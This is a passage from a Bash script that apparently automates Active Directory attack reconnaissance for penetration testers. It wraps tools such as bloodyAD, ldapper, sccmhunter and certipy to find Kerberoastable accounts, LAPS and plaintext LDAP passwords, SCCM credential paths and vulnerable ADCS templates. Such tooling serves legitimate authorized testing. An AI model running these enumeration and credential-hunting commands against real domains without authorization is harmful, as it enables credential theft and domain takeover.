            parse_servers
            echo -e "${CYAN}[*] Searching for containers${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get children --otype container" >"${output_dir}/DomainRecon/bloodyAD/bloodyad_allcontainers_${dc_domain}.txt"
            echo -e "${CYAN}[*] Searching for Kerberoastable${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get search --filter '(&(samAccountType=805306368)(servicePrincipalName=*))' --attr sAMAccountName" | grep sAMAccountName | cut -d ' ' -f 2 | tee "${output_dir}/DomainRecon/bloodyAD/bloodyad_kerberoast_${dc_domain}.txt"
            echo -e "${CYAN}[*] Searching for ASREPRoastable${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName" | tee "${output_dir}/DomainRecon/bloodyAD/bloodyad_asreproast_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

bloodyad_write_enum() {
    if [ ! -f "${bloodyad}" ]; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${output_dir}/DomainRecon/bloodyAD"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] bloodyad search for writable objects${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get writable" | tee "${output_dir}/DomainRecon/bloodyAD/bloodyad_writable_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

bloodyad_dnsquery() {
    if [ ! -f "${bloodyad}" ]; then
        echo -e "${RED}[-] Please verify the installation of bloodyad{NC}"
    else
        mkdir -p "${output_dir}/DomainRecon/bloodyAD"
        if [ "${aeskey_bool}" == true ] || [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] bloodyad requires credentials and does not support Kerberos authentication using AES Key${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            echo -e "${BLUE}[*] bloodyad dump DNS entries${NC}"
            run_command "${bloodyad} ${argument_bloodyad} ${ldaps_param} --host ${dc_FQDN} --dc-ip ${dc_ip} get dnsDump" | tee "${output_dir}/DomainRecon/bloodyAD/bloodyad_dns_${dc_domain}.txt"
            echo -e "${YELLOW}If ADIDNS does not contain a wildcard entry, check for ADIDNS spoofing${NC}"
            sed -n '/[^\n]*\*/,/^$/p' "${output_dir}/DomainRecon/bloodyAD/bloodyad_dns_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

silenthound_enum() {
    if [ ! -f "${silenthound}" ]; then
        echo -e "${RED}[-] Please verify the location of silenthound${NC}"
    else
        mkdir -p "${output_dir}/DomainRecon/SilentHound"
        echo -e "${BLUE}[*] SilentHound Enumeration${NC}"
        if [ -n "$(find "${output_dir}/DomainRecon/SilentHound/" -maxdepth 1 -type f ! -name 'silenthound_output' -print -quit)" ]; then
            echo -e "${YELLOW}[i] SilentHound results found, skipping... ${NC}"
        else
            if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
                echo -e "${PURPLE}[-] SilentHound does not support Kerberos authentication${NC}"
            else
                current_dir=$(pwd)
                cd "${output_dir}/DomainRecon/SilentHound" || exit
                if [ "${ldaps_bool}" == true ]; then ldaps_param="--ssl"; else ldaps_param=""; fi
                run_command "${silenthound} ${argument_silenthd} ${dc_ip} ${dc_domain} -g -n --kerberoast ${ldaps_param} -o ${output_dir}/DomainRecon/SilentHound/${dc_domain}" >"${output_dir}/DomainRecon/SilentHound/silenthound_output_${dc_domain}.txt"
                cd "${current_dir}" || exit
                cut -d " " -f 1 "${output_dir}/DomainRecon/SilentHound/${dc_domain}-hosts.txt" | sort -u | grep "\S" | sed -e "s/$/.${dc_domain}/" >"${output_dir}/DomainRecon/Servers/servers_list_shd_${dc_domain}.txt" 2>/dev/null
                cut -d " " -f 2 "${output_dir}/DomainRecon/SilentHound/${dc_domain}-hosts.txt" >"${output_dir}/DomainRecon/Servers/ip_list_shd_${dc_domain}.txt" 2>/dev/null
                /bin/cp "${output_dir}/DomainRecon/SilentHound/${dc_domain}-users.txt" "${output_dir}/DomainRecon/Users/users_list_shd_${dc_domain}.txt" 2>/dev/null
                head -n 20 "${output_dir}/DomainRecon/SilentHound/silenthound_output_${dc_domain}.txt" 2>/dev/null
                echo -e "............................(truncated output)"
                echo -e "${GREEN}[+] SilentHound enumeration complete.${NC}"
            fi
            parse_users
            parse_servers
        fi
    fi
    echo -e ""
}

ldeep_enum() {
    if [ ! -f "${ldeep}" ]; then
        echo -e "${RED}[-] Please verify the location of ldeep${NC}"
    else
        mkdir -p "${output_dir}/DomainRecon/ldeepDump"
        echo -e "${BLUE}[*] ldeep Enumeration${NC}"
        if [ -n "$(find "${output_dir}/DomainRecon/ldeepDump/" -maxdepth 1 -type f ! -name 'ldeep_output' -print -quit)" ]; then
            echo -e "${YELLOW}[i] ldeep results found, skipping... ${NC}"
        else
            if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
                echo -e "${PURPLE}[-] ldeep does not support Kerberos authentication${NC}"
            else
                if [ "${ldaps_bool}" == true ] || [ "${cert_bool}" == true ]; then ldaps_param="-s ldaps://"; else ldaps_param="-s ldap://"; fi
                run_command "${ldeep} ldap ${argument_ldeep} ${ldaps_param}${target} all ${output_dir}/DomainRecon/ldeepDump/${dc_domain}" 2>&1 | tee "${output_dir}/DomainRecon/ldeepDump/ldeep_output_${dc_domain}.txt"
                /bin/cp "${output_dir}/DomainRecon/ldeepDump/${dc_domain}_users_all.lst" "${output_dir}/DomainRecon/Users/users_list_ldp_${dc_domain}.txt" 2>/dev/null
                /bin/cp "${output_dir}/DomainRecon/ldeepDump/${dc_domain}_computers.lst" "${output_dir}/DomainRecon/Servers/servers_list_ldp_${dc_domain}.txt" 2>/dev/null
                parse_users
                parse_servers
            fi
        fi
    fi
    echo -e ""
}

windapsearch_enum() {
    if [ ! -f "${windapsearch}" ]; then
        echo -e "${RED}[-] Please verify the location of windapsearch${NC}"
    else
        mkdir -p "${output_dir}/DomainRecon/windapsearch"
        echo -e "${BLUE}[*] windapsearch Enumeration${NC}"
        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] windapsearch does not support Kerberos authentication${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--secure"; else ldaps_param=""; fi
            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m users --full" >"${output_dir}/DomainRecon/windapsearch/windapsearch_users_${dc_domain}.txt"
            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m computers --full" >"${output_dir}/DomainRecon/windapsearch/windapsearch_servers_${dc_domain}.txt"
            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m groups --full" >"${output_dir}/DomainRecon/windapsearch/windapsearch_groups_${dc_domain}.txt"
            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m privileged-users --full" >"${output_dir}/DomainRecon/windapsearch/windapsearch_privusers_${dc_domain}.txt"
            run_command "${windapsearch} ${argument_windap} --dc ${dc_ip} ${ldaps_param} -m custom --filter '(&(objectCategory=computer)(servicePrincipalName=MSSQLSvc*))' --attrs dNSHostName | grep dNSHostName | cut -d ' ' -f 2 | sort -u" >"${output_dir}/DomainRecon/Servers/sql_list_windap_${dc_domain}.txt"
            #Parsing user and computer lists
            grep -a "sAMAccountName:" "${output_dir}/DomainRecon/windapsearch/windapsearch_users_${dc_domain}.txt" | sed "s/sAMAccountName: //g" | sort -u >"${output_dir}/DomainRecon/Users/users_list_windap_${dc_domain}.txt" 2>&1
            grep -a "dNSHostName:" "${output_dir}/DomainRecon/windapsearch/windapsearch_servers_${dc_domain}.txt" | sed "s/dNSHostName: //g" | sort -u >"${output_dir}/DomainRecon/Servers/servers_list_windap_${dc_domain}.txt" 2>&1
            grep -a "cn:" "${output_dir}/DomainRecon/windapsearch/windapsearch_groups_${dc_domain}.txt" | sed "s/cn: //g" | sort -u >"${output_dir}/DomainRecon/windapsearch/groups_list_windap_${dc_domain}.txt" 2>&1
            grep -iha "pass\|pwd" "${output_dir}"/DomainRecon/windapsearch/windapsearch_*_"${dc_domain}.txt" | grep -av "badPasswordTime\|badPwdCount\|badPasswordTime\|pwdLastSet\|have their passwords replicated\|RODC Password Replication Group\|msExch" >"${output_dir}/DomainRecon/windapsearch/windapsearch_pwdfields_${dc_domain}.txt"
            if [ -s "${output_dir}/DomainRecon/windapsearch/windapsearch_pwdfields_${dc_domain}.txt" ]; then
                echo -e "${GREEN}[+] Printing passwords found in LDAP fields...${NC}"
                /bin/cat "${output_dir}/DomainRecon/windapsearch/windapsearch_pwdfields_${dc_domain}.txt" 2>/dev/null
            fi
            echo -e "${GREEN}[+] windapsearch enumeration of users, servers, groups complete.${NC}"
            parse_users
            parse_servers
        fi
    fi
    echo -e ""
}

ldapwordharv_enum() {
    if [ ! -f "${LDAPWordlistHarvester}" ]; then
        echo -e "${RED}[-] Please verify the installation of LDAPWordlistHarvester${NC}"
    else
        echo -e "${BLUE}[*] Generating wordlist using LDAPWordlistHarvester${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] LDAPWordlistHarvester requires credentials${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--ldaps"; else ldaps_param=""; fi
            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="-v"; else verbose_p0dalirius=""; fi
            run_command "${LDAPWordlistHarvester} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --kdcHost ${dc_FQDN} --dc-ip ${dc_ip} -o ${output_dir}/DomainRecon/ldapwordharv_${dc_domain}.txt" 2>&1 | tee -a "${output_dir}/DomainRecon/ldapwordharv_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

rdwatool_enum() {
    if [ ! -f "${rdwatool}" ]; then
        echo -e "${RED}[-] Please verify the installation of rdwatool${NC}"
    else
        echo -e "${BLUE}[*] Enumerating RDWA servers using rdwatool${NC}"
        run_command "${rdwatool} recon -tf ${servers_hostname_list}" 2>&1 | tee "${output_dir}/DomainRecon/rdwatool_output_${dc_domain}.txt"
    fi
    echo -e ""
}

sccm_enum() {
    if [ ! -f "${sccmhunter}" ]; then
        echo -e "${RED}[-] Please verify the installation of sccmhunter${NC}"
    else
        echo -e "${BLUE}[*] Enumeration of SCCM using sccmhunter${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] sccmhunter requires credentials${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
            /bin/rm -rf "$HOME/.sccmhunter/logs/" 2>/dev/null
            run_command "${python3} ${sccmhunter} find ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a "${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt"
            run_command "${python3} ${sccmhunter} smb ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -save" 2>&1 | tee "${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt"
            if ! grep -q 'SCCM doesn' "${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt" && ! grep -q 'Traceback' "${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt"; then
                run_command "${python3} ${sccmhunter} show -users" 2>/dev/null | tee -a "${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt"
                run_command "${python3} ${sccmhunter} show -computers" 2>/dev/null | tee -a "${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt"
                run_command "${python3} ${sccmhunter} show -groups" 2>/dev/null | tee -a "${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt"
                run_command "${python3} ${sccmhunter} show -mps" 2>/dev/null | tee -a "${output_dir}/DomainRecon/sccmhunter_output_${dc_domain}.txt"
                echo -e "${GREEN}[+] SCCM server found! Follow steps below to add a new computer and extract the NAAConfig containing creds of Network Access Accounts:${NC}"
                echo -e "${python3} ${sccmhunter} http ${argument_sccm} ${ldaps_param} -dc-ip ${dc_ip} -auto"
            fi
        fi
    fi
    echo -e ""
}

ldapper_enum() {
    if [ ! -f "${ldapper}" ]; then
        echo -e "${RED}[-] Please verify the installation of ldapper${NC}"
    else
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] ldapper requires credentials and does not support Kerberos authentication${NC}"
        else
            mkdir -p "${output_dir}/DomainRecon/LDAPPER"
            echo -e "${BLUE}[*] Enumeration of LDAP using ldapper${NC}"
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-n 1"; else ldaps_param="-n 2"; fi
            echo -e "${CYAN}[*] Get all users${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '1' -f json" >"${output_dir}/DomainRecon/LDAPPER/users_output_${dc_domain}.json"
            /usr/bin/jq -r ".[].samaccountname" "${output_dir}/DomainRecon/LDAPPER/users_output_${dc_domain}.json" 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_ldapper_${dc_domain}.txt"
            echo -e "${CYAN}[*] Get all groups (and their members)${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '2' -f json" >"${output_dir}/DomainRecon/LDAPPER/groups_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Get all printers${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '3' -f json" >"${output_dir}/DomainRecon/LDAPPER/printers_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Get all computers${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '4' -f json" >"${output_dir}/DomainRecon/LDAPPER/computers_output_${dc_domain}.json"
            /usr/bin/jq -r ".[].dnshostname" "${output_dir}/DomainRecon/LDAPPER/computers_output_${dc_domain}.json" 2>/dev/null >"${output_dir}/DomainRecon/Servers/servers_list_ldapper_${dc_domain}.txt"
            echo -e "${CYAN}[*] Get Domain/Enterprise Administrators${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '5' -f json" >"${output_dir}/DomainRecon/LDAPPER/admins_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Get Domain Trusts${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '6' -f json" >"${output_dir}/DomainRecon/LDAPPER/trusts_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Search for Unconstrained SPN Delegations (Potential Priv-Esc)${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '7' -f json" >"${output_dir}/DomainRecon/LDAPPER/unconstrained_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Search for Accounts where PreAuth is not required. (ASREPROAST)${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '8' -f json" >"${output_dir}/DomainRecon/LDAPPER/asrep_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Search for User SPNs (KERBEROAST)${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '9' -f json" >"${output_dir}/DomainRecon/LDAPPER/kerberoastable_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Show All LAPS LA Passwords (that you can see)${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '10' -f json" >"${output_dir}/DomainRecon/LDAPPER/ldaps_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Search for common plaintext password attributes (UserPassword, UnixUserPassword, unicodePwd, and msSFU30Password)${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '11' -f json" >"${output_dir}/DomainRecon/LDAPPER/passwords_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Show All Quest Two-Factor Seeds (if you have access)${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '12' -f json" >"${output_dir}/DomainRecon/LDAPPER/quest_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Oracle 'orclCommonAttribute'SSO password hash${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '13' -f json" >"${output_dir}/DomainRecon/LDAPPER/oracle_sso_common_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Oracle 'userPassword' SSO password hash${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '14' -f json" >"${output_dir}/DomainRecon/LDAPPER/oracle_sso_pass_output_${dc_domain}.json"
            echo -e "${CYAN}[*] Get SCCM Servers${NC}"
            run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -m 0 -s '15' -f json" >"${output_dir}/DomainRecon/LDAPPER/sccm_output_${dc_domain}.json"
        fi
    fi
    echo -e ""
}

adalanche_enum() {
    if [ ! -f "${adalanche}" ]; then
        echo -e "${RED}[-] Please verify the installation of Adalanche${NC}"
    else
        mkdir -p "${output_dir}/DomainRecon/Adalanche"
        echo -e "${BLUE}[*] Adalanche Enumeration${NC}"
        if [ -n "$(ls -A "${output_dir}/DomainRecon/Adalanche/data" 2>/dev/null)" ]; then
            echo -e "${YELLOW}[i] Adalanche results found, skipping... ${NC}"
        else
            if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
                echo -e "${PURPLE}[-] Adalanche requires credentials and does not support Kerberos authentication${NC}"
            else
                current_dir=$(pwd)
                cd "${output_dir}/DomainRecon/Adalanche" || exit
                if [ "${ldaps_bool}" == true ]; then ldaps_param="--tlsmode tls --ignorecert"; else ldaps_param="--tlsmode NoTLS --port 389"; fi
                run_command "${adalanche} ${adalanche_verbose} collect activedirectory ${argument_adalanche} --domain ${dc_domain} --server ${dc_ip} ${ldaps_bool}" | tee "${output_dir}/DomainRecon/Adalanche/adalanche_output_${dc_domain}.txt"
                cd "${current_dir}" || exit
            fi
        fi
    fi
    echo -e ""
}

GPOwned_enum() {
    if [ ! -f "${GPOwned}" ]; then
        echo -e "${RED}[-] Please verify the installation of GPOwned${NC}"
    else
        echo -e "${BLUE}[*] GPO Enumeration using GPOwned${NC}"
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] GPOwned requires credentials and does not support Kerberos authentication${NC}"
        else
            run_command "${GPOwned} ${argument_GPOwned} -dc-ip ${dc_ip} -listgpo -gpcuser" | tee "${output_dir}/DomainRecon/GPOwned_output_${dc_domain}.txt"
            run_command "${GPOwned} ${argument_GPOwned} -dc-ip ${dc_ip} -listgpo -gpcmachine" | tee -a "${output_dir}/DomainRecon/GPOwned_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

ldap_console() {
    if [ ! -f "${ldapconsole}" ]; then
        echo -e "${RED}[-] Please verify the installation of ldapconsole${NC}"
    else
        echo -e "${BLUE}[*] Launching ldapconsole${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] ldapconsole requires credentials ${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="--debug"; else verbose_p0dalirius=""; fi
            run_command "${ldapconsole} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}" 2>&1 | tee -a "${output_dir}/DomainRecon/ldapconsole_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

ldap_monitor() {
    if [ ! -f "${pyLDAPmonitor}" ]; then
        echo -e "${RED}[-] Please verify the installation of pyLDAPmonitor${NC}"
    else
        echo -e "${BLUE}[*] Launching pyLDAPmonitor${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] pyLDAPmonitor requires credentials ${NC}"
        else
            if [ "${ldaps_bool}" == true ]; then ldaps_param="--use-ldaps"; else ldaps_param=""; fi
            if [ "${verbose_bool}" == true ]; then verbose_p0dalirius="--debug"; else verbose_p0dalirius=""; fi
            run_command "${pyLDAPmonitor} ${argument_p0dalirius} ${verbose_p0dalirius} ${ldaps_param} --dc-ip ${dc_ip} --kdcHost ${dc_FQDN}" 2>&1
        fi
    fi
    echo -e ""
}

aced_console() {
    if [ ! -f "${aced}" ]; then
        echo -e "${RED}[-] Please verify the installation of aced${NC}"
    else
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] aced requires credentials${NC}"
        else
            echo -e "${BLUE}[*] Launching aced${NC}"
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-ldaps"; else ldaps_param=""; fi
            run_command "${python3} ${aced} ${argument_aced}\\@${dc_FQDN} ${ldaps_param} -dc-ip ${dc_ip}" 2>&1 | tee -a "${output_dir}/DomainRecon/aced_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

adpeas_enum() {
    if [ ! -f "${adPEAS}" ]; then
        echo -e "${RED}[-] Please verify the installation of adPEAS${NC}"
    else
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ] || [ "${hash_bool}" == true ]; then
            echo -e "${PURPLE}[-] adPEAS only supports password authentication ${NC}"
        else
            mkdir -p "${output_dir}/DomainRecon/adPEAS"
            echo -e "${BLUE}[*] Launching adPEAS${NC}"
            current_dir=$(pwd)
            cd "${output_dir}/DomainRecon/adPEAS" || exit
            run_command "${adPEAS} ${argument_adpeas} -i ${dc_ip}" 2>&1 | tee -a "${output_dir}/DomainRecon/adPEAS_output_${dc_domain}.txt"
            cd "${current_dir}" || exit
        fi
    fi
    echo -e ""
}

breads_console() {
    if [ ! -f "${breads}" ]; then
        echo -e "${RED}[-] Please verify the installation of breads${NC}"
    else
        if [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] breads does not support Kerberos authentication ${NC}"
        else
            echo -e "${BLUE}[*] Launching breads${NC}"
            rm -rf "${HOME}/.breads/${user}_${dc_domain}" 2>/dev/null
            echo "$(date +%Y-%m-%d\ %H:%M:%S); ${breads} | tee -a ${output_dir}/DomainRecon/breads_output_${dc_domain}.txt" >>"$command_log"
            (
                echo -e "create_profile ${user}_${dc_domain}\nload_profile ${user}_${dc_domain}\n${dc_ip}\n${domain}\\\\${user}\n'${password}'${hash}\ncurrent_profile"
                cat /dev/tty
            ) | /usr/bin/script -qc "${breads}" /dev/null | tee -a "${output_dir}/DomainRecon/breads_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

ldapper_console() {
    if [ ! -f "${ldapper}" ]; then
        echo -e "${RED}[-] Please verify the installation of ldapper${NC}"
    else
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] ldapper requires credentials and does not support Kerberos authentication${NC}"
        else
            mkdir -p "${output_dir}/DomainRecon/LDAPPER"
            echo -e "${BLUE}[*] Running ldapper with custom LDAP search string${NC}"
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-n 1"; else ldaps_param="-n 2"; fi
            echo -e "${CYAN}[*] Please choose an option or provide a custom LDAP search string ${NC}"
            echo -e "1.1) Get specific user (You will be prompted for the username)"
            echo -e "2.1) Get specific group (You will be prompted for the group name)"
            echo -e "4.1) Get specific computer (You will be prompted for the computer name)"
            echo -e "9.1) Search for specific User SPN (You will be prompted for the User Principle Name)"
            echo -e "10.1) Search for specific Workstation LAPS Password (You will be prompted for the Workstation Name)"
            echo -e "*) Run custom Query (e.g. (&(objectcategory=user)(serviceprincipalname=*))"
            echo -e "back) Go back"

            read -rp "> " custom_option </dev/tty
            if [[ ! ${custom_option} == "back" ]]; then
                run_command "${python3} ${ldapper} ${argument_ldapper} ${ldaps_param} -S ${dc_ip} -s ${custom_option}" | tee -a "${output_dir}/DomainRecon/LDAPPER/ldapper_console_output_${dc_domain}.txt"
            else
                ad_menu
            fi
            ldapper_console
        fi
    fi
    echo -e ""
}

adcheck_enum() {
    if [ ! -f "${ADCheck}" ]; then
        echo -e "${RED}[-] Please verify the installation of ADCheck${NC}"
    else
        mkdir -p "${output_dir}/DomainRecon/ADCheck"
        echo -e "${BLUE}[*] ADCheck Enumeration${NC}"
        if [ "${nullsess_bool}" == true ] || [ "${kerb_bool}" == true ] || [ "${aeskey_bool}" == true ]; then
            echo -e "${PURPLE}[-] ADCheck requires credentials and does not support Kerberos authentication${NC}"
        else
            current_dir=$(pwd)
            cd "${output_dir}/DomainRecon/ADCheck" || exit
            if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
            run_command "${python3} ${ADCheck} ${argument_adcheck} ${ldaps_param} --dc-ip ${dc_ip} -bhf" | tee "${output_dir}/DomainRecon/ADCheck/ADCheck_output_${dc_domain}.txt"
            cd "${current_dir}" || exit
            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${output_dir}"/DomainRecon/ADCheck/*_users.json 2>/dev/null >"${output_dir}/DomainRecon/Users/users_list_adcheck_${dc_domain}.txt"
            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${output_dir}"/DomainRecon/ADCheck/*_computers.json 2>/dev/null >"${output_dir}/DomainRecon/Servers/servers_list_adcheck_${dc_domain}.txt"
            /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${output_dir}"/DomainRecon/ADCheck/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u >"${output_dir}/DomainRecon/Servers/sql_list_adcheck_${dc_domain}.txt"
            parse_users
            parse_servers
        fi
    fi
    echo -e ""
}

###### adcs_enum: ADCS Enumeration
ne_adcs_enum() {
    if [ ! -f "${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt" ]; then
        echo -e "${BLUE}[*] ADCS Enumeration${NC}"
        if [ "${ldaps_bool}" == true ]; then ldaps_param="--port 636"; else ldaps_param=""; fi
        run_command "${netexec} ${ne_verbose} ldap ${target} ${argument_ne} ${ldaps_param} -M adcs --kdcHost ${dc_FQDN} --log ${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt" 2>&1
    else
        echo -e "${YELLOW}[i] ADCS info found, skipping...${NC}"
    fi
    pki_servers=$(grep "Found PKI Enrollment Server" "${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt" | cut -d ":" -f 4 | cut -d " " -f 2 | awk '!x[$0]++')
    pki_cas=$(grep "Found CN" "${output_dir}/ADCS/ne_adcs_output_${dc_domain}.txt" | cut -d ":" -f 4 | cut -d " " -f 2 | awk '!x[$0]++')
}

certi_py_enum() {
    if [[ ! -f "${certi_py}" ]]; then
        echo -e "${RED}[-] Please verify the installation of certi.py${NC}"
    else
        echo -e "${BLUE}[*] certi.py Enumeration${NC}"
        if [ "${nullsess_bool}" == true ]; then
            echo -e "${PURPLE}[-] certi.py requires credentials${NC}"
        else
            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class ca" 2>&1 | tee "${output_dir}/ADCS/certi.py_CA_output_${dc_domain}.txt"
            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --class service" 2>&1 | tee "${output_dir}/ADCS/certi.py_CAServices_output_${dc_domain}.txt"
            run_command "${certi_py} list ${argument_certi_py} --dc-ip ${dc_ip} --vuln --enabled" 2>&1 | tee "${output_dir}/ADCS/certi.py_vulntemplates_output_${dc_domain}.txt"
        fi
    fi
    echo -e ""
}

certipy_enum() {
    if [[ ! -f "${certipy}" ]]; then
        echo -e "${RED}[-] Please verify the installation of certipy${NC}"
    else
        echo -e "${BLUE}[*] Certipy Enumeration${NC}"
        if [ -n "$(ls -A "${output_dir}"/ADCS/*_Certipy* 2>/dev/null)" ]; then
            echo -e "${YELLOW}[i] Certipy results found, skipping... ${NC}"
        else
            if [ "${nullsess_bool}" == true ]; then
                echo -e "${PURPLE}[-] certipy requires credentials${NC}"
            else
                current_dir=$(pwd)
                cd "${output_dir}/ADCS" || exit
                if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-scheme ldap"; fi
                run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -stdout -old-bloodhound" >"${output_dir}/ADCS/certipy_output_${dc_domain}.txt"
                run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dc_ip} -dns-tcp ${ldaps_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 | tee -a "${output_dir}/ADCS/certipy_vulnerable_output_${dc_domain}.txt"
                cd "${current_dir}" || exit
            fi
